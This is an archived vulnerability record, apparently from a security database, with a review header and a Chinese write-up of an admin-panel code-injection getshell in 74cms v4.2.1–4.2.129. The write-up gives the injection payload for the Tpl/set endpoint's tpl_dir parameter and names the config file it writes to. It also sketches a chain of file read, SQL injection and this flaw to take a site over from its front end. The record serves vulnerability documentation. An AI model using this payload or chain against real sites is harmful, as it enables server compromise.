---
source: "hatch 补库批 20260928"
product: "74cms"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "74cms v4.2.1 - v4.2.129-后台getshell漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：4.2.1–4.2.129 stated; admin Tpl/set access; optional file-read + SQL injection chain"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-a1fe13129c6979a6f3b576fd"
entity_id: "ve-a1fe13129c6979a6f3b576fd"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：4.2.1–4.2.129 stated; admin Tpl/set access; optional file-read + SQL injection chain

- **证据待核（1）**：Source-flow explanation almost entirely screenshots。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **证据待核（2）**：Several images point to another SQL-injection article's resource folder; verify content rather than assuming broken。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（3）**：Front-to-back chain depends on separate vulnerabilities and unsupported stacked-query claim; do not classify this admin endpoint as unauthenticated。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（4）**：Upgrade instructions are run-on and lack historical date。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 74cms v4.2.1-v4.2.129-后台getshell漏洞

0x00 前言
---------

厂商：74cms下载地址：http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。

0x01 74cms升级到最新版
----------------------

1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，
搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php6， 查找所有\$\_SERVER\[\'HTTP\_HOST\'\] 改为 http://baidu.com 即可

0x02漏洞演示
------------

![](./.resource/74cmsv4.2.1-v4.2.129-后台getshell漏洞/media/rId24.png)

    url: http://74cms.test/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),'

    shell:http://74cms.test/Application/Home/Conf/config.php
    路径：\74cms\upload\Application\Home\Conf\config.php

![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId25.png)

![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId26.png)

0x03 漏洞原理
-------------

    url: http://74cms.test/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),'
    路径：74cms\upload\Application\Admin\Controller\TplController.class.php

![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId28.png)

    路径： 74cms\upload\Application\Common\Controller\BackendController.class.php

![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId29.png)

0x04题外话-认真版getshell方法
-----------------------------

认真版getshell方法：实际上想要进行getshell利用组合漏洞是很简单的事情。我的前台日到后台的getshell方法是这样的。首先利用-任意文件读取漏洞-读取系统中的hash值然后在通过漏洞-前台sql注入-来插入用户数据-因为我发现他可以支持执行双语句所以可以执行mysql双语句插入一条管理员用户在通过这个后台getshell漏洞即可完成一套日穿

四、参考链接
------------

> https://www.yuque.com/pmiaowu/bfgkkh/wecilm
